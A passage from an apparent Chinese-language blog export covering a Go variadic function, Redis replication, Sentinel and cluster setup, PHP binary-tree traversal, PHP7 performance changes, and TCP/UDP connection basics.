<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">errorf</span><span class="params">(linenum <span class="keyword">int</span>, format <span class="keyword">string</span>, args ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    fmt.Fprintf(os.Stderr, <span class="string">&quot;Line %d: &quot;</span>, linenum)</span><br><span class="line">    fmt.Fprintf(os.Stderr, format, args...)</span><br><span class="line">    fmt.Fprintln(os.Stderr)</span><br><span class="line">&#125;</span><br><span class="line">linenum, name := <span class="number">12</span>, <span class="string">&quot;count&quot;</span></span><br><span class="line">errorf(linenum, <span class="string">&quot;undefined: %s&quot;</span>, name) <span class="comment">// &quot;Line 12: undefined: count&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>interface{}表示函数的最后一个参数可以接收任意类型</p>
]]></content>
      <categories>
        <category>Go</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>关于redis的主从、哨兵、集群</title>
    <url>/2017/11/02/%E5%85%B3%E4%BA%8Eredis%E7%9A%84%E4%B8%BB%E4%BB%8E%E3%80%81%E5%93%A8%E5%85%B5%E3%80%81%E9%9B%86%E7%BE%A4werwer/</url>
    <content><![CDATA[<h3 id="关于redis主从、哨兵、集群的介绍网上很多，这里就不赘述了。"><a href="#关于redis主从、哨兵、集群的介绍网上很多，这里就不赘述了。" class="headerlink" title="关于redis主从、哨兵、集群的介绍网上很多，这里就不赘述了。"></a>关于redis主从、哨兵、集群的介绍网上很多，这里就不赘述了。</h3><h3 id="一、主从"><a href="#一、主从" class="headerlink" title="一、主从"></a>一、主从</h3><blockquote>
<p>通过持久化功能，Redis保证了即使在服务器重启的情况下也不会损失（或少量损失）数据，因为持久化会把内存中数据保存到硬盘上，重启会从硬盘上加载数据。<br>但是由于数据是存储在一台服务器上的，如果这台服务器出现硬盘故障等问题，也会导致数据丢失。为了避免单点故障，通常的做法是将数据库复制多个副本以部署在不同的服务器上，这样即使有一台服务器出现故障，其他服务器依然可以继续提供服务。为此， Redis 提供了复制（replication）功能，可以实现当一台数据库中的数据更新后，自动将更新的数据同步到其他数据库上。</p>
</blockquote>
<blockquote>
<p>在复制的概念中，数据库分为两类，一类是主数据库（master），另一类是从数据库[1] （slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而从数据库一般是只读的，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。</p>
</blockquote>
<blockquote>
<h4 id="主从数据库的配置"><a href="#主从数据库的配置" class="headerlink" title="主从数据库的配置"></a>主从数据库的配置</h4><p>master slave<br>主不用配置，从redis的conf文件加入 slaveof ip port 就可以了<br>或者从redis启动时 redis-server –port 6380 –slaveof 127.0.0.1 6379<br> 从数据库一般是只读，可以改为可写，但写入的数据很容易被主同步没，所以还是只读就可以。<br>也可以在运行是使用slaveof ip port命令，停止原来的主，切换成刚刚设置的主 slaveof no one会把自己变成主</p>
<h4 id="复制原理"><a href="#复制原理" class="headerlink" title="复制原理"></a>复制原理</h4><p>当从数据库启动时，会向主数据库发送sync命令，主数据库接收到sync后开始在后台报错快照rdb，在保存快照期间受到的命名缓存起来，当快照完成时，主数据库会将快照和缓存的命令一块发送给从。复制初始化结束。<br>之后，主每受到1个命令就同步发送给从。<br>当出现断开重连后，2.8之后的版本会将断线期间的命令传给重数据库。增量复制</p>
<p>主从复制是乐观复制，当客户端发送写执行给主，主执行完立即将结果返回客户端，并异步的把命令发送给从，从而不影响性能。也可以设置至少同步给多少个从主才可写。<br>无硬盘复制:如果硬盘效率低将会影响复制性能，2.8之后可以设置无硬盘复制，repl-diskless-sync yes</p>
</blockquote>
<h3 id="二、哨兵"><a href="#二、哨兵" class="headerlink" title="二、哨兵"></a>二、哨兵</h3><blockquote>
<p>当主数据库遇到异常中断服务后，开发者可以通过手动的方式选择一个从数据库来升格为主数据库，以使得系统能够继续提供服务。然而整个过程相对麻烦且需要人工介入，难以实现自动化。 为此，Redis 2.8中提供了哨兵工具来实现自动化的系统监控和故障恢复功能。<br>哨兵的作用就是监控redis主、从数据库是否正常运行，主出现故障自动将从数据库转换为主数据库。</p>
<p>顾名思义，哨兵的作用就是监控Redis系统的运行状况。它的功能包括以下两个。</p>
<p> （1）监控主数据库和从数据库是否正常运行。<br> （2）主数据库出现故障时自动将从数据库转换为主数据库。</p>
<p><a href="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160909152623127.png"><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20160909152623658.png" alt="image" title="image"></a><br>可以用info replication查看主从情况<br>例子：<br>1主2从 1哨兵,可以用命令起也可以用配置文件里<br>可以使用双哨兵，更安全，<br>redis-server –port 6379<br>redis-server –port 6380 –slaveof 192.168.0.167 6379<br>redis-server –port 6381 –slaveof 192.168.0.167 6379</p>
<p>redis-sentinel sentinel.conf<br>哨兵配置文件<br> sentinel.conf<br> sentinel monitor mymaster 192.168.0.167 6379 1</p>
<p>其中mymaster表示要监控的主数据库的名字，可以自己定义一个。这个名字必须仅由大小写字母、数字和“.-_”这 3 个字符组成。后两个参数表示主数据库的地址和端口号，这里我们要监控的是主数据库6379。<br>注意:</p>
<p> 1、使用时不能用127.0.0.1，需要用真实IP，不然java程序通过哨兵会连到java程序所在的机器(127.0.0.1 )</p>
<p> 2、配置哨兵监控一个系统时，只需要配置其监控主数据库即可，哨兵会自动发现所有复制该主数据库的从数据库</p>
<p>这样哨兵就能监控主6379和从6380、6381，一旦6379挂掉，哨兵就会在2个从中选择一个作为主，根据优先级选，如果一样就选个id小的，当6379再起来就作为从存在。</p>
<p>主从切换过程：</p>
<p>（1） slave leader升级为master<br>（2） 其他slave修改为新master的slave<br>（3） 客户端修改连接<br>（4） 老的master如果重启成功，变为新master的slave</p>
<p>哨兵监控1主2从，停掉主，哨兵会选出1个从作为主，变成1主1从。然而当我把原来的主再起来，它不会作为从，只是个独立的节点。</p>
<p>如果在新的主刚被选出来时，我把原来的主起来，它就能成为新主的从节点。<br>如果在新的主选出来过一会再起原来的主，就不能成为新主的从节点<br>或者在老的主起来后，重启哨兵也能把它变成从，哨兵配置文件里有，哨兵会执行“+convert-to-slave”</p>
<p>这很奇怪，我也没弄明白是怎么回事。</p>
</blockquote>
<h3 id="三、集群"><a href="#三、集群" class="headerlink" title="三、集群"></a>三、集群</h3><blockquote>
<p>即使使用哨兵，redis每个实例也是全量存储，每个redis存储的内容都是完整的数据，浪费内存且有木桶效应。为了最大化利用内存，可以采用集群，就是分布式存储。即每台redis存储不同的内容，<br>共有16384个slot。每个redis分得一些slot，hash_slot = crc16(key) mod 16384 找到对应slot，键是可用键，如果有{}则取{}内的作为可用键，否则整个键是可用键<br>集群至少需要3主3从，且每个实例使用不同的配置文件，主从不用配置，集群会自己选。</p>
<p>修改每个实例的配置文件：</p>
<p> cluster-enabled yes –开启集群</p>
<p> cluster-config-file nodes-6382.conf –集群配置文件名，每个实例配置的要不同，redis会根据文件名自动新建</p>
<h5 id="用集群工具创建集群："><a href="#用集群工具创建集群：" class="headerlink" title="用集群工具创建集群："></a>用集群工具创建集群：</h5><p>我们可以用集群工具进行集群，该工具是redis源码包中，用ruby编写，所以需要先安装ruby。</p>
<p>1、安装rubygems</p>
</blockquote>
<blockquote>
<p>yum install ruby<br> yum install rubygems<br> gem install redis</p>
<p>2、把6个redis实例都起来，每个实例的集群都打开。</p>
</blockquote>
<blockquote>
<p>3、redis安装目录的src执行./redis-trib.rb create –replicas 1 127.0.0.1:6380 127.0.0.1:6381 127.0.0.1:6382 127.0.0.1:6383 127.0.0.1:6384 127.0.0.1:6385</p>
<p>提示信息如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Connecting to node <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6380</span>: OK </span><br><span class="line">Connecting to node <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6381</span>: OK </span><br><span class="line">Connecting to node <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6382</span>: OK </span><br><span class="line">Connecting to node <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6383</span>: OK </span><br><span class="line">Connecting to node <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6384</span>: OK </span><br><span class="line">Connecting to node <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6385</span>: OK </span><br><span class="line">&gt;&gt;&gt; Performing hash slots allocation on <span class="number">6</span> nodes... </span><br><span class="line">Using <span class="number">3</span> masters: </span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6380</span> </span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6381</span> </span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6382</span> </span><br><span class="line">Adding replica <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6383</span> to <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6380</span> </span><br><span class="line">Adding replica <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6384</span> to <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6381</span> </span><br><span class="line">Adding replica <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6385</span> to <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6382</span> </span><br><span class="line">M: d4f906940d68714db787a60837f57fa496de5d12 <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6380</span> slots:<span class="number">0</span>-<span class="number">5460</span> (<span class="number">5461</span> slots) master </span><br><span class="line">M: b547d05c9d0e188993befec4ae5ccb430343fb4b <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6381</span> slots:<span class="number">5461</span>-<span class="number">10922</span> (<span class="number">5462</span> slots) master </span><br><span class="line">M: <span class="number">887f</span>e91bf218f203194403807e0aee941e985286 <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6382</span> slots:<span class="number">10923</span>-<span class="number">16383</span> (<span class="number">5461</span> slots) master</span><br><span class="line">S: e0f6559be7a121498fae80d44bf18027619d9995 <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6383</span> replicates d4f906940d68714db787a60837f57fa496de5d12 </span><br><span class="line">S: a61dbf654c9d9a4d45efd425350ebf720a6660fc <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6384</span> replicates b547d05c9d0e188993befec4ae5ccb430343fb4b </span><br><span class="line">S: <span class="number">551e5094789035</span>affc489db267c8519c3a29f35d <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6385</span> replicates <span class="number">887f</span>e91bf218f203194403807e0aee941e985286 </span><br><span class="line">Can I set the above configuration? (type <span class="string">&#x27;yes&#x27;</span> to accept):</span><br></pre></td></tr></table></figure>



<p>输入yes，这样集群就建立了。</p>
<p>登录任一台redis，执行 info cluster，提示cluster_enabled:1</p>
<h5 id="集群过程："><a href="#集群过程：" class="headerlink" title="集群过程："></a>集群过程：</h5><p>首先redis-trib.rb会以客户端的形式尝试连接所有的节点，并发送PING命令以确定节点能够正常服务。如果有任何节点无法连接，则创建失败。同时发送 INFO 命令获取每个节点的运行ID以及是否开启了集群功能（即cluster_enabled为1）。 准备就绪后集群会向每个节点发送 CLUSTER MEET命令，格式为 CLUSTER MEET ip port，这个命令用来告诉当前节点指定ip和port上在运行的节点也是集群的一部分，从而使得6个节点最终可以归入一个集群。</p>
<p>然后redis-trib.rb会分配主从数据库节点，分配的原则是尽量保证每个主数据库运行在不同的IP地址上，同时每个从数据库和主数据库均不运行在同一IP地址上，以保证系统的容灾能力</p>
<p>3主3从，当1个主故障，大家会给对应的从投票，把从立为主，若没有从数据库可以恢复则redis集群就down了。</p>
<h5 id="客户端连接："><a href="#客户端连接：" class="headerlink" title="客户端连接："></a>客户端连接：</h5><p>使用redis-cli -c -p 任意一个端口</p>
</blockquote>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>php实现先序、中序、后序遍历二叉树</title>
    <url>/2017/10/23/php%E5%AE%9E%E7%8E%B0%E5%85%88%E5%BA%8F%E3%80%81%E4%B8%AD%E5%BA%8F%E3%80%81%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<p>二叉树是每个节点最多有两个子树的树结构。通常子树被称作“左子树”（left subtree）和“右子树”（right subtree）。二叉树常被用于实现二叉查找树和二叉堆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Node&#123;</span><br><span class="line">    public $value;</span><br><span class="line">    public $left;</span><br><span class="line">    public $right;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;先序遍历 根节点 ---&gt; 左子树 ---\&gt; 右子树</span><br><span class="line">function preorder($root)&#123;</span><br><span class="line">    $stack&#x3D;array();</span><br><span class="line">    array_push($stack,$root);</span><br><span class="line">    while(!empty($stack))&#123;</span><br><span class="line">        $center_node&#x3D;array_pop($stack);</span><br><span class="line">        echo $center_node-&gt;value.&#39; &#39;;&#x2F;&#x2F;先输出根节点</span><br><span class="line">        if($center_node-&gt;right!&#x3D;null)&#123;</span><br><span class="line">            array_push($stack,$center_node-&gt;right);&#x2F;&#x2F;压入左子树</span><br><span class="line">        &#125;</span><br><span class="line">        if($center_node-&gt;left!&#x3D;null)&#123;</span><br><span class="line">            array_push($stack,$center_node-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;中序遍历，左子树---&gt; 根节点 ---\&gt; 右子树</span><br><span class="line">function inorder($root)&#123;</span><br><span class="line">    $stack &#x3D; array();</span><br><span class="line">    $center_node &#x3D; $root;</span><br><span class="line">    while (!empty($stack) || $center_node !&#x3D; null) &#123;</span><br><span class="line">             while ($center_node !&#x3D; null) &#123;</span><br><span class="line">                 array_push($stack, $center_node);</span><br><span class="line">                 $center_node &#x3D; $center_node-&gt;left;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             $center_node &#x3D; array_pop($stack);</span><br><span class="line">             echo $center_node-&gt;value . &quot; &quot;;</span><br><span class="line"></span><br><span class="line">             $center_node &#x3D; $center_node-&gt;right;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;后序遍历，左子树 ---&gt; 右子树 ---\&gt; 根节点</span><br><span class="line">function tailorder($root)&#123;</span><br><span class="line">    $stack&#x3D;array();</span><br><span class="line">    $outstack&#x3D;array();</span><br><span class="line">    array_push($stack,$root);</span><br><span class="line">    while(!empty($stack))&#123;</span><br><span class="line">        $center_node&#x3D;array_pop($stack);</span><br><span class="line">        array_push($outstack,$center_node);&#x2F;&#x2F;最先压入根节点，最后输出</span><br><span class="line">        if($center_node-&gt;left!&#x3D;null)&#123;</span><br><span class="line">            array_push($stack,$center_node-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        if($center_node-&gt;right!&#x3D;null)&#123;</span><br><span class="line">            array_push($stack,$center_node-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while(!empty($outstack))&#123;</span><br><span class="line">        $center_node&#x3D;array_pop($outstack);</span><br><span class="line">        echo $center_node-&gt;value.&#39; &#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new Node();</span><br><span class="line">$b&#x3D;new Node();</span><br><span class="line">$c&#x3D;new Node();</span><br><span class="line">$d&#x3D;new Node();</span><br><span class="line">$e&#x3D;new Node();</span><br><span class="line">$f&#x3D;new Node();</span><br><span class="line">$a-&gt;value&#x3D;&#39;A&#39;;</span><br><span class="line">$b-&gt;value&#x3D;&#39;B&#39;;</span><br><span class="line">$c-&gt;value&#x3D;&#39;C&#39;;</span><br><span class="line">$d-&gt;value&#x3D;&#39;D&#39;;</span><br><span class="line">$e-&gt;value&#x3D;&#39;E&#39;;</span><br><span class="line">$f-&gt;value&#x3D;&#39;F&#39;;</span><br><span class="line">$a-&gt;left&#x3D;$b;</span><br><span class="line">$a-&gt;right&#x3D;$c;</span><br><span class="line">$b-&gt;left&#x3D;$d;</span><br><span class="line">$c-&gt;left&#x3D;$e;</span><br><span class="line">$c-&gt;right&#x3D;$f;</span><br><span class="line">preorder($a);&#x2F;&#x2F;A B D C E F</span><br><span class="line">echo &#39;&lt;hr&#x2F;&gt;&#39;;</span><br><span class="line">inorder($a);&#x2F;&#x2F;D B A E C F</span><br><span class="line">echo &#39;&lt;hr&#x2F;&gt;&#39;;</span><br><span class="line">tailorder($a);&#x2F;&#x2F;D B E F C A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP7快在哪里</title>
    <url>/2017/08/22/php7%E5%BF%AB%E5%9C%A8%E5%93%AA%E9%87%8C/</url>
    <content><![CDATA[<p>PHP7 带来许多新的特性：</p>
<ul>
<li>抽象语法树，在编译opcode时能够做更多的优化</li>
<li>INT64提升，支持大于2GB的字符串/文件上传</li>
<li>标量类型声明，可以声明参数类型</li>
<li>返回值声明，可以声明返回值类型</li>
<li>新操作符，&lt;=&gt;操作符，大于返回1，等于返回0，小于返回-1</li>
<li>统一变量语法；</li>
<li>引擎异常改进，函数不存在的fata error转为异常可以捕获处理</li>
</ul>
<p>等等。 除了新特性外，PHP 7使用了新引擎<a href="https://wiki.php.net/phpng">PHP NG</a>，性能得到了巨大的提升（<a href="http://www.laruence.com/2014/12/18/2976.html">与HHVM对比</a>）。 这里的性能优化比较有意思， 非常值得借鉴学习。为什么要进行重构：</p>
<ul>
<li>PHP 5.4之后php引擎的性能提升已经不大，Zend VM已经高度优化</li>
<li>PHP JIT(Just In Time Compiler)项目在benchmakr上性能提升巨大（8倍），但是在实际业务提升不大（离开实际业务谈benchmark都是耍流氓）</li>
<li>分析wordpress项目发现瓶颈并不在Zend VM上面，21% CPU时间花在了内存管理，12%时间花在了hashTable操作，30% CPU时间花在了内部调用，25% CUP时间花在了VM</li>
</ul>
<p>首先应当分析实际业务的性能消耗占比，确定需要优化的地方。JIT仅仅优化了Zend VM，提升是有限的，需要对其他地方（内存操作，HashTable，函数调用）也进行优化，所以才进行的重构。 PHP NG在很多方面做了优化：</p>
<ul>
<li>标量类型不做引用计数，zval分配在堆上，增加Referance类型</li>
<li>增加类型zend string，将字符串与值连续分配，避免CPU cache miss，避免二次读内存</li>
<li>原本的HashTable变为zend array，数组值为zval，内存一次分配，提升data locality，避免CPU cache miss</li>
<li>函数调用优化，减少重复入栈</li>
<li>参数解析优化，将不确定转化为确定</li>
<li>zend_qsort排序优化</li>
<li>内存管理优化，减少CPU cache miss</li>
<li>常用函数优化</li>
<li>字符串拼接优化，减少内存访问次数</li>
</ul>
<p>通过这一系列的优化，改进了PHP的内存操作，改进了HashTable操作，改进了内部函数调用，降低了CPU 时间消耗，这时候再来做PHP JIT优化就有意义。PHP 7接下来仍然会继续优化，迁移常用扩展。 许多优化都是微小的，但是积累起来后却是巨大，特别是对于微博这样的网站，1%的性能提升都意义非凡。 优化是具有专向性的，对A场景的优化可能并不适合B场景，所以需要分析实际的业务中的瓶颈和调用频次，权衡优化的方向。 现在距离10月份发布已经不远了，大家也可以检查自己项目是否兼容PHP 7，性能提升多少。</p>
<p>参考链接：<br> <a href="http://www.infoq.com/cn/presentations/php7-new-engine-for-good-old-train">PHP7 – New engine for good old train</a></p>
<p> <a href="http://www.laruence.com/2014/12/18/2976.html">PHP7 VS HHVM (WordPress)</a></p>
<p> <a href="https://wiki.php.net/phpng">PHPNG (next generation)</a></p>
<p> <a href="http://www.sitepoint.com/php-fights-hhvm-zephir-phpng/">What to Expect When You’re Expecting: PHP 7, Part 1</a></p>
<p> <a href="https://philsturgeon.uk/php/2015/03/15/php-7-feature-freeze/">PHP 7 Feature Freeze</a></p>
<p> <a href="http://hhvm.com/">HHVM</a></p>
<p> <a href="http://wuduoyi.com/note/hhvm/">HHVM 是如何提升 PHP 性能的？</a></p>
<p> <a href="http://www.sitepoint.com/php-fights-hhvm-zephir-phpng/">PHP Fights HHVM and Zephir with PHPNG</a></p>
<p><a href="https://github.com/rlerdorf/php7dev">rlerdorf/php7dev</a></p>
<p><a href="http://akrabat.com/building-and-testing-php7/">Building and testing the upcoming PHP7</a></p>
<p><a href="http://www.zimuel.it/install-php-7/">Install PHP 7 on Ubuntu 14.04</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP7</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP协议中的三次握手和四次挥手(图解)</title>
    <url>/2017/08/15/TCP%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8C%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B(%E5%9B%BE%E8%A7%A3)/</url>
    <content><![CDATA[<p> </p>
<h3 id="建立TCP需要三次握手才能建立，而断开连接则需要四次握手。"><a href="#建立TCP需要三次握手才能建立，而断开连接则需要四次握手。" class="headerlink" title="建立TCP需要三次握手才能建立，而断开连接则需要四次握手。"></a>建立TCP需要三次握手才能建立，而断开连接则需要四次握手。</h3><p> 整个过程如下图所示：</p>
<p><img src="http://qiniu.fengmumiao.com/hi.csdn.net%252Fattachment%252F201108%252F7%252F0_131271823564Rx.gif.png"></p>
<h3 id="先来看看如何建立连接的。"><a href="#先来看看如何建立连接的。" class="headerlink" title="先来看看如何建立连接的。"></a>先来看看如何建立连接的。</h3><p><img src="http://qiniu.fengmumiao.com/img-blog.csdn.net%252F20170104214009596%253Fwatermark%252F2%252Ftext%252FaHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2h1c2xlaQ%253D%253D%252Ffont%252F5a6L5L2T%252Ffontsize%252F400%252Ffill%252FI0JBQkFCMA%253D%253D%252Fdissolve%252F70%252Fgravity%252FCenter.png"></p>
<p>首先Client端发送连接请求报文，Server段接受连接后回复ACK报文，并为这次连接分配资源。Client端接收到ACK报文后也向Server段发生ACK报文，并分配资源，这样TCP连接就建立了。</p>
<h3 id="那如何断开连接呢？简单的过程如下："><a href="#那如何断开连接呢？简单的过程如下：" class="headerlink" title="那如何断开连接呢？简单的过程如下："></a>那如何断开连接呢？简单的过程如下：</h3><p><img src="http://qiniu.fengmumiao.com/hi.csdn.net%252Fattachment%252F201108%252F7%252F0_1312718564tZXD.gif.png"></p>
<p><strong>【注意】中断连接端可以是Client端，也可以是Server端。</strong></p>
<p> 假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
<h3 id="整个过程Client端所经历的状态如下："><a href="#整个过程Client端所经历的状态如下：" class="headerlink" title="整个过程Client端所经历的状态如下："></a>整个过程Client端所经历的状态如下：</h3><p><img src="http://qiniu.fengmumiao.com/hi.csdn.net%252Fattachment%252F201108%252F7%252F0_1312719804oSkK.gif.png"></p>
<p>而Server端所经历的过程如下：</p>
<p><img src="http://hi.csdn.net/attachment/201108/7/0_1312719833030b.gif"></p>
<p><strong>【注意】</strong> 在TIME_WAIT状态中，如果TCP client端最后一次发送的ACK丢失了，它将重新发送。TIME_WAIT状态中所需要的时间是依赖于实现方法的。典型的值为30秒、1分钟和2分钟。等待之后连接正式关闭，并且所有的资源(包括端口号)都被释放。</p>
<p><strong>【问题1】为什么连接的时候是三次握手，关闭的时候却是四次握手？</strong><br>答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。</p>
<p><strong>【问题2】为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？</strong></p>
<p>答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假象网络是不可靠的，有可以最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。</p>
<p>！</p>
]]></content>
      <categories>
        <category>网络编程</category>
      </categories>
      <tags>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP与UDP基本区别</title>
    <url>/2017/08/12/tcp%E4%B8%8Eudp%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p> </p>
<p>TCP UDP</p>
<p>TCP与UDP基本区别</p>
<p>  1.基于连接与无连接</p>
<p>  2.TCP要求系统资源较多，UDP较少； </p>
<p>  3.UDP程序结构较简单 </p>
<p>  4.流模式（TCP）与数据报模式(UDP); </p>
<p>  5.TCP保证数据正确性，UDP可能丢包 </p>
<p>  6.TCP保证数据顺序，UDP不保证 </p>
<p>UDP应用场景：</p>
<p>  1.面向数据报方式</p>
<p>  2.网络数据大多为短消息 </p>
<p>  3.拥有大量Client</p>
<p>  4.对数据安全性无特殊要求</p>
<p>  5.网络负担非常重，但对响应速度要求高</p>
<p>具体编程时的区别</p>
<p>   1.socket()的参数不同 </p>
<p>　　 2.UDP Server不需要调用listen和accept </p>
<p>　　 3.UDP收发数据用sendto/recvfrom函数 </p>
<p>　　 4.TCP：地址信息在connect/accept时确定 </p>
<p>　　 5.UDP：在sendto/recvfrom函数中每次均 需指定地址信息 </p>
<p>　　 6.UDP：shutdown函数无效</p>
<p>编程区别</p>
<p>   通常我们在说到网络编程时默认是指TCP编程，即用前面提到的socket函数创建一个socket用于TCP通讯，函数参数我们通常填为SOCK_STREAM。即socket(PF_INET, SOCK_STREAM, 0)，这表示建立一个socket用于流式网络通讯。 </p>
<p>　  SOCK_STREAM这种的特点是面向连接的，即每次收发数据之前必须通过connect建立连接，也是双向的，即任何一方都可以收发数据，协议本身提供了一些保障机制保证它是可靠的. 有序的，即每个包按照发送的顺序到达接收方。 </p>
<p>　　而SOCK_DGRAM这种是User Datagram Protocol协议的网络通讯，它是无连接的，不可靠的，因为通讯双方发送数据后不知道对方是否已经收到数据，是否正常收到数据。任何一方建立一个socket以后就可以用sendto发送数据，也可以用recvfrom接收数据。根本不关心对方是否存在，是否发送了数据。它的特点是通讯速度比较快。大家都知道TCP是要经过三次握手的，而UDP没有。 </p>
<p>基于上述不同，UDP和TCP编程步骤也有些不同，如下：</p>
<p>TCP: </p>
<p>TCP编程的服务器端一般步骤是： </p>
<p>　　1. 创建一个socket，用函数socket()； </p>
<p>　　2. 设置socket属性，用函数setsockopt(); * 可选 </p>
<p>　　3. 绑定IP地址. 端口等信息到socket上，用函数bind(); </p>
<p>　　4. 开启监听，用函数listen()； </p>
<p>　　5. 接收客户端上来的连接，用函数accept()； </p>
<p>　　6. 收发数据，用函数send()和recv()，或者read()和write(); </p>
<p>　　7. 关闭网络连接； </p>
<p>　　8. 关闭监听； </p>
<p>TCP编程的客户端一般步骤是： </p>
<p>　　1. 创建一个socket，用函数socket()； </p>
<p>　　2. 设置socket属性，用函数setsockopt();* 可选 </p>
<p>　　3. 绑定IP地址. 端口等信息到socket上，用函数bind();* 可选 </p>
<p>　　4. 设置要连接的对方的IP地址和端口等属性； </p>
<p>　　5. 连接服务器，用函数connect()； </p>
<p>　　6. 收发数据，用函数send()和recv()，或者read()和write(); </p>
<p>　　7. 关闭网络连接；</p>
<p>UDP:</p>
<p>与之对应的UDP编程步骤要简单许多，分别如下： </p>
<p>　　UDP编程的服务器端一般步骤是： </p>
<p>　　1. 创建一个socket，用函数socket()； </p>
<p>　　2. 设置socket属性，用函数setsockopt();* 可选 </p>
<p>　　3. 绑定IP地址、 端口等信息到socket上，用函数bind(); </p>
<p>　　4. 循环接收数据，用函数recvfrom(); </p>
<p>　　5. 关闭网络连接； </p>
<p>UDP编程的客户端一般步骤是： </p>
<p>　　1. 创建一个socket，用函数socket()； </p>
<p>　　2. 设置socket属性，用函数setsockopt();* 可选 </p>
<p>　　3. 绑定IP地址、 端口等信息到socket上，用函数bind();* 可选 </p>
<p>　　4. 设置对方的IP地址和端口等属性; </p>
<p>　　5. 发送数据，用函数sendto(); </p>
<p>　　6. 关闭网络连接；</p>
<p>TCP和UDP是OSI模型中的运输层中的协议。TCP提供可靠的通信传输，而UDP则常被用于让广播和细节控制交给应用的通信传输。</p>
<p>UDP补充：</p>
